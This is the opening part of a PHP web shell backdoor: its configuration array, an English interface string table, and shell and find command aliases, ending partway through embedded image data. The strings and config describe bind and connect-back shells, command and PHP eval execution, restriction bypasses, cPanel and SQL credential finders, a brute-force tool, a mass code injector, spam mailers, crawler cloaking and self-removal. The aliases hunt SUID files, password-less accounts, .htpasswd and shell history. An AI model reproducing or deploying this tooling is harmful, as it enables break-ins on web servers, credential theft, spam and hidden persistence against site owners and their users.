<?php /* Copyright &>/dev/null */
$config = array(
    "version" => "2.0.2011.0827",
     /* build version. */
    "auth" => array(
        "use_auth" => false,
         /* bool value, TRUE=[ Ask for login ] / FALSE=[ Don't ask ] */
        "md5_user" => "63a9f0ea7bb98050796b649e85481845", // root
        "md5_pass" => "bad5908652c705ebe436af598446a1dd"), // priv8
    "default_vars" => array(
        "language" => "en",
         /* default lang, en=English */
        "email" => "jjj777eee@hush.ai",
         /* send results from specific tools to this address */
        "default_sort" => "0a",
         /* column 0, a=Ascending d=Descending */
        "default_act" => "tools",
         /* available: ls, search, upload, cmd, eval, sql, mailer, encoders, tools, processes, sysinfo */
        "bind_port" => "31337",
        "bind_pass" => "P@55w0rd",
        "backcon_port" => "31337",
        "sql_host" => "localhost",
        "sql_user" => "root",
        "sql_db" => "mysql",
        "sql_table" => "users",
        "ftp_user" => "anonymous",
        "ftp_pass" => "anonymous@ftp.com",
        "downloada" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR",
        ),
    "banned" => array("agents" => array(
            "Google",
            "Slurp",
            "MSNBot",
            "ia_archiver",
            "Yandex",
            "Rambler"), /* This agents (matched in regexp) are not allowed */ "send_header" =>
            'HTTP/1.0 404 Not Found'),
     /* Will send this header and exit. */
    "use_buffer" => 1,
     /* bool value, TRUE=[ Allow copy/paste ], FALSE=[..] */
    "visual" => array(
        "width" => "1024",
         /* Table width in pixels */
        "images" => 1,
         /* bool value, TRUE=[ Show icons ] / FALSE=[ Don't show icons ] */
        "skins" => array("dark", "light"),
        "default_skin" => "light",
         /* Default color skin */
        "light" => array(
            "bodybg" => "#717678",
            "tbarbg1" => "#AAAAAA",
            "tbarbg2" => "#BFBFBF",
            "tbarbordert" => "#BBBBBB",
            "tbarborderb" => "#AAAAAA",
            "topbg1" => "#BBBBBB",
            "topbg2" => "#CCCCCC",
            "topborder1" => "#CDCDCD",
            "topcolor" => "#333333",
            "topshadow" => "#DDDDDD",
            "tlinkcolor" => "#333333",
            "tlinkshadow" => "#DDDDDD",
            "tlinkcolorhover" => "#000000",
            "qlbg1" => "#CCCCCC",
            "qlbg2" => "#AAAAAA",
            "qlborder" => "#DDDDDD",
            "qlcolor" => "#222222",
            "qlshadow" => "#DDDDDD",
            "qlcolorhover" => "#000000",
            "footerbg1" => "#CCCCCC",
            "footerbg2" => "#AAAAAA",
            "footerborder1" => "#BBBBBB",
            "footercolor" => "#333333",
            "footershadow" => "#DDDDDD",
            "tablebg" => "#F2F2F2",
            "tableshadow" => "#666666",
            "tableborder" => "#777777 ",
            "errcolor" => "#FF0000",
            "okcolor" => "#008200",
            "normalcolor" => "#333333",
            "dircolor" => "#333333",
            "fontfam" => "'sans-serif',sans-serif",
            "fontcolor" => "#525252",
            "idirborder" => "#2F7595",
            "idirbg1" => "#93BED7",
            "idirbg2" => "#63A0C7",
            "ifileborder" => "#cccccc",
            "ifilebg1" => "#FFFFFF",
            "ifilebg2" => "#DDDDDD",
            "reg_self" => "#7B7869",
            "reg_interesting" => "#008200",
            "reg_bad" => "#FF0000",
            ),
        "dark" => array(
            "bodybg" => "#717678",
            "tbarbg1" => "#141414",
            "tbarbg2" => "#111111",
            "tbarbordert" => "#111111",
            "tbarborderb" => "#000000",
            "topbg1" => "#111111",
            "topbg2" => "#222222",
            "topborder1" => "#222222",
            "topcolor" => "#CCCCCC",
            "topshadow" => "#000000",
            "tlinkcolor" => "#DDDDDD",
            "tlinkshadow" => "#000000",
            "tlinkcolorhover" => "#FFFFFF",
            "qlbg1" => "#222222",
            "qlbg2" => "#111111",
            "qlborder" => "#333333",
            "qlcolor" => "#F3F3F3",
            "qlshadow" => "#0A0A0A",
            "qlcolorhover" => "#FFFFFF",
            "footerbg1" => "#141414",
            "footerbg2" => "#111111",
            "footerborder1" => "#333333",
            "footercolor" => "#CCCCCC",
            "footershadow" => "#000000",
            "tablebg" => "#F2F2F2",
            "tableshadow" => "#444444",
            "tableborder" => "#666666",
            "errcolor" => "#FF0000",
            "okcolor" => "#008200",
            "normalcolor" => "#333333",
            "dircolor" => "#333333",
            "fontfam" => "'sans-serif',sans-serif",
            "fontcolor" => "#525252",
            "idirborder" => "#2F7595",
            "idirbg1" => "#93BED7",
            "idirbg2" => "#63A0C7",
            "ifileborder" => "#cccccc",
            "ifilebg1" => "#FFFFFF",
            "ifilebg2" => "#DDDDDD",
            "reg_self" => "#7B7869",
            "reg_interesting" => "#008200",
            "reg_bad" => "#FF0000",
            ),
        ),
    "reg_interesting" => array("d" => array('backup', 'admin'),
            /* highlight interesting dirs */ "f" => array(
            'conf(.*)\.php$',
            '\.sql$',
            '\.db$',
            'auth(.*)\.php$') /* highlight interesting files */ ),
    "reg_bad" => array("d" => array('root'), /* highlight bad dirs */ "f" => array('iptables',
                'ipchains') /* highlight bad files */ ),
    );

$lang["en"] = array(
    "0" => "AUTHENTICATION REQUIRED",
    "1" => "USER",
    "2" => "PASS",
    "3" => "Connect",
    "4" => "SERVER WHOIS",
    "5" => "TRACEROUTE",
    "6" => "SELF REMOVE",
    "7" => "LOGOUT",
    "8" => "SYS",
    "9" => "KERNEL",
    "10" => "DISK TOTAL/FREE",
    "11" => "WEB SOFTWARE",
    "12" => "SAFE MODE",
    "13" => "OPEN BASEDIR",
    "14" => "CURL",
    "15" => "MYSQL",
    "16" => "MSSQL",
    "17" => "ORACLE",
    "18" => "POSTGRESQL",
    "19" => "ON",
    "20" => "OFF",
    "21" => "YES",
    "22" => "NO",
    "23" => "BACK",
    "24" => "FILES",
    "25" => "SEARCH",
    "26" => "UPLOAD",
    "27" => "CMD",
    "28" => "EVAL",
    "29" => "SQL",
    "30" => "MAILERS",
    "31" => "CALC",
    "32" => "TOOLS",
    "33" => "PROC",
    "34" => "SYSINFO",
    "35" => "FILE",
    "36" => "DIR",
    "37" => "Show All",
    "38" => "Dirs",
    "39" => "Files",
    "40" => "Archives",
    "41" => "Exes",
    "42" => "PHP",
    "43" => "Html",
    "44" => "Text",
    "45" => "Images",
    "46" => "Other",
    "47" => "Show Icons",
    "48" => "Hide Icons",
    "49" => "Enable Buffer",
    "50" => "Disable Buffer",
    "51" => "Empty Buffer",
    "52" => "Show Buffer",
    "53" => "Hide Buffer",
    "54" => "Paste Copy",
    "55" => "Paste Cut",
    "56" => "Paste All",
    "57" => "Name",
    "58" => "Size",
    "59" => "Modified",
    "60" => "Owner/Group",
    "61" => "Perms",
    "62" => "Action",
    "63" => "Select All",
    "64" => "None",
    "65" => "Inverse",
    "66" => "With Selected",
    "67" => "Copy",
    "68" => "Cut",
    "69" => "Unset Copy",
    "70" => "Unset Cut",
    "71" => "Unset All",
    "72" => "Delete",
    "73" => "Rename",
    "74" => "Functions",
    "75" => "Edit",
    "76" => "Download",
    "77" => "Confirm",
    "78" => "VIEWING FILE:",
    "79" => "Text",
    "80" => "Code",
    "81" => "Html",
    "82" => "Html-NoJS",
    "83" => "Execute",
    "84" => "Session",
    "85" => "Sdb",
    "86" => "INI",
    "87" => "Image",
    "88" => "Hexdump",
    "89" => "Browser Default",
    "90" => "STRING CONVERSIONS",
    "91" => "FUNCTION",
    "92" => "Submit",
    "93" => "CHANGE FILE'S PERMISSIONS:",
    "94" => "Owner",
    "95" => "Group",
    "96" => "World",
    "97" => "Read",
    "98" => "Write",
    "99" => "Execute",
    "100" => "Chmod",
    "101" => "OR ENTER VALUE",
    "102" => "OUTPUT",
    "103" => "CHANGE FILE'S TIMESTAMP",
    "104" => "COPY FROM FILE/DIR",
    "105" => "SET TIME MANUALLY",
    "106" => "Month",
    "107" => "Day",
    "108" => "Year",
    "109" => "Hour",
    "110" => "Min",
    "111" => "Sec",
    "112" => "Change",
    "113" => "Timestamp changed to [%1%]",
    "114" => "Failed to change timestamp",
    "115" => "REPLACE",
    "116" => "WITH",
    "117" => "Replace",
    "118" => "Reset",
    "119" => "Save",
    "120" => "PROGRAM LINE",
    "121" => "Full Hexdump",
    "122" => "Hexdump Preview",
    "123" => "CHANGE DIR'S PERMISSIONS:",
    "124" => "CHANGE DIR'S TIMESTAMP:",
    "125" => "BYPASS RESTRICTIONS - LIST DIR",
    "126" => "DIR TO LIST",
    "127" => "List Dir",
    "128" => "BYPASS RESTRICTIONS - READ FILE",
    "129" => "FILE TO READ",
    "130" => "Read File",
    "131" => "BYPASS RESTRICTIONS - READ FILE VIA SQL",
    "132" => "USERNAME",
    "133" => "PASSWORD",
    "134" => "PORT",
    "135" => "DATABASE",
    "136" => "[-] ERROR! Can't select database",
    "137" => "[-] ERROR! Can't connect to [%1%] server",
    "138" => "BYPASS RESTRICTIONS - WRITE FILE",
    "139" => "FILE TO WRITE",
    "140" => "FILE CONTENT",
    "141" => "Write File",
    "142" => "SEARCH FOR FILES AND DIRS USING PHP",
    "143" => "NAME/FIND/RECURSIVE",
    "144" => "Files",
    "145" => "Dirs",
    "146" => "Both",
    "147" => "Search",
    "148" => "use regexp on name",
    "149" => "SEARCH IN DIR",
    "150" => "FIND TEXT IN FILE",
    "151" => "use regexp on text",
    "152" => "whole words only",
    "153" => "case sensitive",
    "154" => "files not containing the text",
    "155" => "SEARCH TEXT IN FILES USING FIND",
    "156" => "TEXT TO FIND",
    "157" => "FIND IN FILES",
    "158" => "DEFINED/SEARCH IN",
    "159" => "show in file manager",
    "160" => "NOTHING FOUND",
    "161" => "UPLOAD LOCAL FILE",
    "162" => "LOCAL FILE",
    "163" => "OPTIONAL RENAME",
    "164" => "UPLOAD PATH",
    "165" => "FILE LOCATION",
    "166" => "MULTIPLE FILES",
    "167" => "UPLOAD FILE FROM REMOTE URL",
    "168" => "UPLOAD MULTIPLE FILES",
    "169" => "Form",
    "170" => "Upload",
    "171" => "Invalid file location: [%1%]",
    "172" => "Error uploading [%1%] (Can't move [%2%] to [%3%]",
    "173" => "File [%1%] uploaded to [%2%]",
    "174" => "Can't download file!",
    "175" => "Can't write to [%1%]",
    "176" => "File uploaded to [%1%]",
    "177" => "SEND FILE TO E-MAIL",
    "178" => "SEND TO",
    "179" => "Send",
    "180" => "COMMAND",
    "181" => "DEFINED",
    "182" => "EXECUTE PHP CODE",
    "183" => "Execute PHP Code",
    "184" => "Display Result in Textarea",
    "185" => "FTP MANAGER",
    "186" => "HOST:PORT",
    "187" => "USER",
    "188" => "PASS",
    "189" => "Connect",
    "190" => "Passive",
    "191" => "Can't connect",
    "192" => "PHP-SHELL",
    "193" => "FTP",
    "194" => "NEW DIR",
    "195" => "Create",
    "196" => "Disconnect",
    "197" => "Upload",
    "198" => "Download",
    "199" => "Delete",
    "200" => "DOWNLOAD FILE FROM REMOTE FTP",
    "201" => "UPLOAD FILE TO REMOTE FTP",
    "202" => "HOST:PORT",
    "203" => "USER:PASS",
    "204" => "FILE ON FTP",
    "205" => "LOCAL FILE",
    "206" => "Upload File",
    "207" => "Download File",
    "208" => "File uploaded.",
    "209" => "Can't upload file.",
    "210" => "File downloaded.",
    "211" => "Can't download file.",
    "212" => "PHP SIMPLE MAILER",
    "213" => "PHP CSV MAILER",
    "214" => "FROM NAME",
    "215" => "FROM E-MAIL",
    "216" => "E-MAIL SUBJECT",
    "217" => "REPLACE",
    "218" => "WITH",
    "219" => "IN",
    "220" => "E-MAIL COL",
    "221" => "COL PREFIX",
    "222" => "REPLACE IN",
    "223" => "Select Value",
    "224" => "From Name",
    "225" => "From E-mail",
    "226" => "Receiver's E-mail",
    "227" => "Receiver's E-mail - hash",
    "228" => "Subject",
    "229" => "Message",
    "230" => "Subject and Message",
    "231" => "Random \"FROM E-MAIL\" usernames",
    "232" => "Random Message-ID domains",
    "233" => "Send E-mails",
    "234" => "Preview (Don't send)",
    "235" => "Show replaced values",
    "236" => "INCOMPLETE DATA",
    "237" => "NO",
    "238" => "RECEIVER",
    "239" => "SENDER",
    "240" => "MESSAGE-ID",
    "241" => "STATUS",
    "242" => "REPLACING",
    "243" => "Success",
    "244" => "Failed",
    "245" => "Test",
    "246" => "HASH TYPE",
    "247" => "ENTER HASH",
    "248" => "Submit",
    "249" => "Calculate",
    "250" => "Clear Input",
    "251" => "POSSIBLE",
    "252" => "Link",
    "253" => "IP ADDRESS ENCODER",
    "254" => "ENTER IP",
    "255" => "LONG IP",
    "256" => "HEX IP",
    "257" => "OCTAL IP",
    "258" => "SELECT HASH",
    "259" => "ENTER INPUT",
    "260" => "All",
    "261" => "HASH OUTPUT",
    "262" => "STRING CONVERSIONS OUTPUT",
    "263" => "Clear Output",
    "264" => "Send Output to Input",
    "265" => "BIND SHELL",
    "266" => "CONNECT BACK",
    "267" => "PASS:PORT:SRC",
    "268" => "Bind",
    "269" => "Found [%1%] of our backdoor tools in tempdir. Consider deleting tools after using them. ",
    "270" => "Delete Now",
    "271" => "Can't write sources!",
    "272" => "Unknown file!",
    "273" => "Executed. Can't connect to [%1%]!",
    "274" => "OK! Connect to [%1%]:[%2%]!",
    "275" => "Port [%1%] already in use!",
    "276" => "OK! The script is now connecting to [%1%]:[%2%]",
    "277" => "PORTSCAN",
    "278" => "HOST:PORT RANGE",
    "279" => "Scan",
    "280" => "VALID RANGE 0-65535",
    "281" => "PHP-SHELL HUNTER",
    "282" => "ACTION:RECURSIVE",
    "283" => "START PATH",
    "284" => "View known shells only",
    "285" => "View known shells + possible",
    "286" => "Overwrite known shells with RC-Shell",
    "287" => "Overwrite all with RC-Shell",
    "288" => "PHP-SHELL RESULTS",
    "289" => "PORTSCAN RESULT",
    "290" => "Owned",
    "291" => "Can't own it",
    "292" => "FILE NAME",
    "293" => "SHELL TYPE OR VERSION",
    "294" => "EXTERNAL LINK",
    "295" => "FILE ACTIONS / OVERWRITE",
    "296" => "View in Browser",
    "297" => "RC-OVERWRITE",
    "298" => "CPANEL / PASSWORD FINDER",
    "299" => "HOST:USER:SERVICE",
    "300" => "FILES:METHOD:RECURSIVE",
    "301" => "DEFINED PATH",
    "302" => "SEND LOG TO",
    "303" => "Don't login (create passfile)",
    "304" => "user + DEFINED PATH",
    "305" => "user + DOCUMENT ROOT",
    "306" => "/etc/passwd + USER HOMES",
    "307" => "Find Passwords",
    "308" => "CPANEL / PASSWORD FINDER RESULTS",
    "309" => "MASS CODE INJECTOR",
    "310" => "FILES:POS:RECURSIVE",
    "311" => "START IN PATH",
    "312" => "CODE TO INJECT",
    "313" => "Inject Files",
    "314" => "CODE INJECTED IN FILES BELOW",
    "315" => "FIND SQL CREDENTIALS",
    "316" => "USER NAME:TYPE",
    "317" => "PASS NAME:TYPE",
    "318" => "DB NAME:TYPE",
    "319" => "HOST NAME:TYPE",
    "320" => "*SOFTWARE:PASSWORD",
    "321" => "FILES:WHERE:RECURSIVE",
    "322" => "DEFINED PATH",
    "323" => "Find Credentials",
    "324" => "MySQL Test",
    "325" => "DEFINED PATH",
    "326" => "DOCUMENT ROOT",
    "327" => "USER HOMES",
    "328" => "required",
    "329" => "optional",
    "330" => "SQL CREDENTIALS",
    "331" => "HOST",
    "332" => "USER",
    "333" => "PASS",
    "334" => "DATABASE",
    "335" => "ACTION",
    "336" => "MySQL Connect",
    "337" => "BRUTEFORCE / DICTIONARY ATTACK",
    "338" => "HOST:PORT:SERVICE",
    "339" => "USERNAME:DATABASE",
    "340" => "DICTIONARY",
    "341" => "TEST METHOD",
    "342" => "ALSO TEST",
    "343" => "username and dictionary",
    "344" => "/etc/passwd (user:user)",
    "345" => "/etc/passwd and dictionary",
    "346" => "Start Bruteforce",
    "347" => "[%1%] BRUTEFORCE RESULT",
    "348" => "SYSTEM PROCESSES",
    "349" => "SENDING SIGNAL [%1%] TO #[%2%].. ",
    "350" => "KILLED",
    "351" => "CAN'T KILL IT",
    "352" => "Databases",
    "353" => "Query",
    "354" => "Extract E-mails",
    "355" => "Server Status",
    "356" => "Server Variables",
    "357" => "Processes",
    "358" => "Disconnect",
    "359" => "DATABASES",
    "360" => "Database Name",
    "361" => "Size",
    "362" => "Tables",
    "363" => "Database Actions",
    "364" => "DATABASE",
    "365" => "TABLE",
    "366" => "DATABASE [%1%]",
    "367" => "Databases ([%1%])",
    "368" => "Table Name",
    "369" => "Table Actions",
    "370" => "SQL QUERY",
    "371" => "Submit Query",
    "372" => "EXTRACT E-MAILS",
    "373" => "SEARCH TABLES<br>COMMA (,) SEPARATED<br>LEAVE EMPTY FOR ALL",
    "374" => "FILE NAME",
    "375" => "SAVE E-MAILS TO FILE",
    "376" => "DOWNLOAD RESULTS",
    "377" => "Extract E-mails",
    "378" => "SERVER STATUS",
    "379" => "SERVER VARIABLES",
    "380" => "Name",
    "381" => "Value",
    "382" => "PROCESSES",
    "383" => "ID",
    "384" => "USER",
    "385" => "HOST",
    "386" => "DATABASE",
    "387" => "COMMAND",
    "388" => "TIME",
    "389" => "STATE",
    "390" => "INFO",
    "391" => "ACTION",
    "392" => "KILL",
    "393" => "PROCESS #[%1%] KILLED",
    "394" => "QUERY RESULT",
    "395" => "BROWSING TABLE [%1%] ( [%2%] cols and [%3%] rows )",
    "396" => "Previous",
    "397" => "Page",
    "398" => "Go",
    "399" => "Next",
    "400" => "INSERT INTO TABLE [%1%]",
    "401" => "Field",
    "402" => "Type",
    "403" => "Function",
    "404" => "Value",
    "405" => "Insert as new row",
    "406" => "or",
    "407" => "Save",
    "408" => "Confirm",
    "409" => "TOTAL DATABASES [%1%]",
    "410" => "QUICK SQL TABLE DUMP",
    "411" => "SQL TYPE",
    "412" => "HOST:PORT",
    "413" => "USER:PASS",
    "414" => "DB.TABLE",
    "415" => "FILE NAME",
    "416" => "DOWNLOAD RESULTS",
    "417" => "SAVE DUMP TO FILE",
    "418" => "Dump",
    "419" => "Can't connect to SQL server",
    "420" => "QUICK SQL QUERY",
    "421" => "DB",
    "422" => "Query",
    "423" => "QUERY #[%1%] : [%2%]",
    "424" => "NONE",
    "425" => "Chdir",
    "426" => "Total: [%1%]",
    "427" => "Success: [%1%]",
    "428" => "Failed: [%1%]",
    "429" => "Used: [%1%]",
    "430" => "Not Available",
    "431" => "The following e-mails were not sent",
    "432" => "HASH CALCULATOR",
    "433" => "STRING CONVERSIONS",
    "434" => "HOST:PORT:SRC",
    "435" => "Connect",
    "436" => "Find Shells",
    "437" => "DO YOU REALLY WANT TO DROP DATABASE \"[%1%]\" ? ",
    "438" => "DO YOU REALLY WANT TO DROP TABLE \"[%1%]\" ? ",
    "439" => "DO YOU REALLY WANT TO EMPTY TABLE \"[%1%]\" ? ",
    "440" => "SQL DUMP",
    "441" => "DATABASE",
    "442" => "DUMP TABLES<br>COMMA (,) SEPARATED<br>LEAVE EMPTY FOR ALL",
    "443" => "FILE NAME",
    "444" => "SAVE DUMP TO FILE",
    "445" => "DOWNLOAD RESULTS",
    "446" => "Dump",
    "447" => "Can't select database",
    "448" => "Nothing to dump",
    "449" => "Dumped to [%1%]",
    "450" => "Can't write to file.",
    "451" => "SQL MANAGER",
    "452" => "HOST:PORT",
    "453" => "USER",
    "454" => "PASS",
    "455" => "DB",
    "456" => "TYPE",
    "457" => "Connect",
    "458" => "Can't create dump",
    "459" => "Dumped",
    "460" => "SELF REMOVE",
    "461" => "DO YOU REALLY WANT TO DELETE ME? ",
    "462" => "GOOD BYE",
    "463" => "Can't delete [%1%]",
    "464" => "CAN'T LIST [%1%]",
    "465" => "Free: [%1%]",
    "466" => "FILE [%1%] DOESNT EXIST.",
    "467" => "YOU ARE TRYING TO OPEN A DIRECTORY AS A FILE ([%1%])",
    "468" => "TARGET ALREADY EXISTS (DIRECTORY [%1%])",
    "469" => "FILE NOT SPECIFIED",
    "470" => "Return",
    "471" => "Your browser doesnt support iframes.",
    "472" => " (CWD SPECIFIED AS A FILE)",
    "473" => "RENAME [%1%]",
    "474" => "RENAMED TO [%1%]",
    "475" => "CANNOT RENAME [%1%]",
    "476" => "EXTRACTED ZIP ARCHIVE [%1%]",
    "477" => "CANNOT EXTRACT [%1%]",
    "478" => "Extract [%1%]",
    "479" => "GENERAL INFORMATION",
    "480" => "PHP INFORMATION",
    "481" => "OTHER USEFULL STUFF",
    "482" => "Interesting files",
    "483" => "Interesting configs",
    "484" => "Interesting bins",
    "485" => "Scripting languages",
    "486" => "PAGE GENERATED IN [%1%] SECONDS",
    "undefined" => "?",
    );

$winaliases = array(
    '' => 'dir',
    '- show open ports' => 'netstat -nat',
    '- running programs' => 'tasklist -v',
    '- running services' => 'net start',
    '- show users' => 'net user',
    '- show computers' => 'net view',
    '- arp table' => 'arp -a',
    '- ip config' => 'ipconfig /all',
    '- mac address' => 'getmac',
    '- systeminfo' => 'systeminfo',
    '- file associations' => 'assoc');

$nixaliases = array(
    '' => 'ls -la',
    'console downloaders' => 'which wget GET ftp curl w3m lynx',
    'cpu info' => 'cat /proc/version /proc/cpuinfo',
    'gcc compiler' => 'locate gcc',
    'logged in users' => 'w',
    'active users (from lastlog)' => 'lastlog|grep -v \'\\*\\*\'',
    'last logins (last -a)' => 'last -a',
    'users without password' => 'cut -d: -f1,2,3 /etc/passwd | grep ::',
    'list file attributes' => 'lsattr -va',
    'show open ports (from netstat)' => 'netstat -nat | grep -i listen',
    'active connections (from lsof)' => 'lsof -i',
    );

$findaliases = array(
    'find suid files' => 'find %path% -type f -perm -04000 -ls 2>/dev/null',
    'find sgid files' => 'find %path% -type f -perm -02000 -ls 2>/dev/null',
    'find writable dirs' => 'find %path% -perm -2 -type d -ls 2>/dev/null',
    'find writable files' => 'find %path% -perm -2 -type f -ls 2>/dev/null',
    'find writable links' => 'find %path% -perm -2 -type l -ls 2>/dev/null',
    'find writable dirs/files/links' => 'find %path% -perm -2 -ls 2>/dev/null',
    'find config* files' => 'find %path% -type f -name \'config*\'',
    'find config.php files' => 'find %path% -type f -name config.php',
    'find config.inc.php files' => 'find %path% -type f -name config.inc.php',
    'find service.pwd files' => 'find %path% -type f -name service.pwd',
    'find .htpasswd files' => 'find %path% -type f -name .htpasswd',
    'find .bash history' => 'find %path% -type f -name .bash_history',
    'find .mysql history' => 'find %path% -type f -name .mysql_history',
    'find fetchmailrc' => 'find %path% -type f -name .fetchmailrc');

$filealiases = array(
    'html' => array(
        'html',
        'htm',
        'shtml'),
    'text' => array(
        'html',
        'htm',
        'shtml',
        'css',
        'js',
        'txt',
        'conf',
        'bat',
        'bak',
        'doc',
        'log',
        'sfc',
        'cfg',
        'readme',
        'todo',
        'changelog',
        'makefile',
        'cmake',
        'copying',
        'authors',
        'motd',
        'news',
        'install',
        'about',
        'htaccess'),
    'exe' => array(
        'sh',
        'bat',
        'cmd',
        'exe',
        'pl',
        'py'),
    'ini' => array('ini', 'inf'),
    'code' => array(
        'php',
        'phtml',
        'php3',
        'php4',
        'php5',
        'pl',
        'cgi',
        'c',
        'cc',
        'cpp',
        'h',
        'hpp',
        'icl',
        'ipp'),
    'img' => array(
        'gif',
        'png',
        'jpeg',
        'jfif',
        'jpg',
        'jpe',
        'bmp',
        'ico',
        'tif',
        'tiff'),
    'sdb' => array('sdb'),
    'sess' => array('sess'),
    'download' => array(
        'sql',
        '3g2',
        '3ga',
        '3gp',
        '3gpp',
        '669',
        '7z',
        'aac',
        'ac3',
        'ace',
        'aif',
        'aifc',
        'aiff',
        'amr',
        'ape',
        'arj',
        'asf',
        'asx',
        'au',
        'avi',
        'awb',
        'axa',
        'axv',
        'bdm',
        'bdmv',
        'bz',
        'bz2',
        'cab',
        'clpi',
        'com',
        'cpi',
        'doc',
        'dot',
        'divx',
        'dmg',
        'dv',
        'exe',
        'fla',
        'flac',
        'flc',
        'fli',
        'flv',
        'gsm',
        'gz',
        'iso',
        'it',
        'kar',
        'lha',
        'lnk',
        'lzh',
        'm15',
        'm2t',
        'm2ts',
        'm3u',
        'm3u8',
        'm4a',
        'm4b',
        'm4v',
        'med',
        'mid',
        'midi',
        'minipsf',
        'mka',
        'mkv',
        'mng',
        'mo3',
        'mod',
        'moov',
        'mov',
        'movie',
        'mp+',
        'mp2',
        'mp3',
        'mp4',
        'mpc',
        'mpe',
        'mpeg',
        'mpg',
        'mpga',
        'mpl',
        'mpls',
        'mpp',
        'mtm',
        'mts',
        'nrg',
        'nsv',
        'oga',
        'ogg',
        'ogm',
        'ogv',
        'pbk',
        'pif',
        'pla',
        'pls',
        'psf',
        'psflib',
        'psid',
        'qt',
        'qtvr',
        'r00',
        'ra',
        'rar',
        'rax',
        'rv',
        'rvx',
        's3m',
        'sid',
        'snd',
        'spx',
        'src',
        'stm',
        'swf',
        'tar',
        'tbz',
        'tbz2',
        'tgz',
        'ts',
        'tta',
        'ult',
        'uni',
        'uu',
        'uuf',
        'viv',
        'vivo',
        'vlc',
        'vob',
        'voc',
        'wav',
        'wax',
        'wma',
        'wmv',
        'wmx',
        'wri',
        'wv',
        'xla',
        'xlc',
        'xld',
        'xlsb',
        'xll',
        'xlm',
        'xls',
        'xlt',
        'xlsm',
        'xlw',
        'xltm',
        'wvc',
        'wvp',
        'wvx',
        'xi',
        'xm',
        'xmf',
        'xxe',
        'zip'));

$execaliases = array(
    'sh %f%' => array('sh'),
    'perl %f%' => array('pl', 'cgi'),
    'python %f%' => array('py'),
    'php %f%' => array(
        'php',
        'php3',
        'php4',
        'php5'));

$getaliases = array(
    'wget' => '[%1%] [%2%] -O [%3%]',
    'fetch' => '[%1%] -p [%2%] -o [%3%]',
    'lynx' => '[%1%] -source [%2%] > [%3%]',
    'links' => '[%1%] -source [%2%] > [%3%]',
    'GET' => '[%1%] [%2%] > [%3%]',
    'curl' => '[%1%] [%2%] -o [%3%]');

$index = array(
    "xls" => array(
        'xla',
        'xlc',
        'xld',
        'xlsb',
        'xll',
        'xlm',
        'xls',
        'xlt',
        'xlsm',
        'xlw',
        'xltm'),
    "pl" => array("pl", "cgi"),
    "diz" => array("diz", "inf"),
    "h" => array("h", "hpp"),
    "iso" => array(
        "iso",
        "nrg",
        "dmg"),
    "tar" => array(
        "tar",
        "r00",
        "ace",
        "arj",
        "bz",
        "bz2",
        "tbz",
        "tbz2",
        "tgz",
        "uu",
        "xxe",
        "zip",
        "cab",
        "gz",
        "lha",
        "lzh",
        "pbk",
        "rar",
        "uuf",
        "7z"),
    "php" => array(
        "php",
        "php3",
        "php4",
        "php5",
        "phtml",
        "shtml"),
    "jpg" => array(
        "jpg",
        "gif",
        "png",
        "jpeg",
        "jfif",
        "jpe",
        "bmp",
        "ico",
        "tif",
        "tiff"),
    "html" => array(
        "html",
        "htm",
        "asp",
        "xhtml"),
    "avi" => array(
        'ogm',
        'mpeg',
        'bdmv',
        'qtvr',
        'ogv',
        'cpi',
        'm2ts',
        'movie',
        'asf',
        'mpls',
        'mkv',
        'avi',
        'rvx',
        'qt',
        'mp2',
        'mp4',
        'divx',
        'mng',
        'axv',
        'rv',
        'mov',
        'moov',
        'mpe',
        'mpl',
        'mpg',
        'ts',
        'nsv',
        '3g2',
        '3ga',
        'mts',
        'm2t',
        '3gp',
        '3gpp',
        'vivo',
        'm4v',
        'flc',
        'bdm',
        'fli',
        'viv',
        'flv',
        'wmv',
        'clpi',
        'vob',
        'dv',
        'ogg'),
    "doc" => array(
        "doc",
        "dot",
        "wri"),
    "txt" => array(
        "txt",
        "log",
        "conf",
        "cfg",
        "vbs",
        "ini"),
    "js" => array("js"),
    "cmd" => array(
        "cmd",
        "bat",
        "pif",
        "exe",
        "sh",
        "makefile"),
    "wri" => array("wri", "rtf"),
    "swf" => array("swf", "fla"),
    "mp3" => array(
        'amr',
        'm3u8',
        'med',
        'spx',
        'spx',
        'kar',
        'mpga',
        'pla',
        'it',
        'ape',
        'tta',
        'pls',
        'stm',
        'mid',
        's3m',
        'asx',
        'mka',
        'awb',
        'psf',
        'aifc',
        'mo3',
        'aiff',
        'mp+',
        'axa',
        'mp2',
        'mp3',
        'ra',
        'mod',
        'wav',
        'wax',
        'mpc',
        'midi',
        'mpp',
        'm15',
        'psid',
        'wv',
        'mtm',
        'xi',
        'xm',
        'm3u',
        'm4b',
        'm4a',
        'aac',
        'ac3',
        'xmf',
        'rax',
        'minipsf',
        'wma',
        'wmx',
        'vlc',
        'ult',
        '669',
        'sid',
        'voc',
        'gsm',
        'au',
        'uni',
        'flac',
        'aif',
        'snd',
        'psflib',
        'wvc',
        'oga',
        'wvp',
        'ogg',
        'wvx'),
    "cpp" => array(
        "cpp",
        "c",
        "cc",
        "cxx"),
    "css" => array('css'),
    "htaccess" => array(
        "htaccess",
        "htpasswd",
        "ht",
        "hta"),
    );

$images = array(
    "ok" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAADoSURBVDiNrZOxboNADIY/08CAunTIQBakSLRbH6Qv0XfrQ/QBmLM1iqIMERnaDqxcJsBdOHQhXJOI/JJ1Z8v32z7boqpMQTDpNTDz2OfA08BmgO8zT1Udkwz4BUoreZ6/qqoMfX0ZAByA0CpJktSXSlgAj45+dAk6ZN1ZAT8A4nThWUQ+Hec94LZoCUhX9huwG2YA8DWWZof1pRJs2jfhrgSVqq6sEobhS13XD1Y3xmziOO597UU8o5yJyDvQExRF8ZGm6ZbTj/XPQRAEx7Zte4IoikYj+QiqpmlKTnfFDKP/V8LVmLyNf9lXY6ltlYsrAAAAAElFTkSuQmCC",
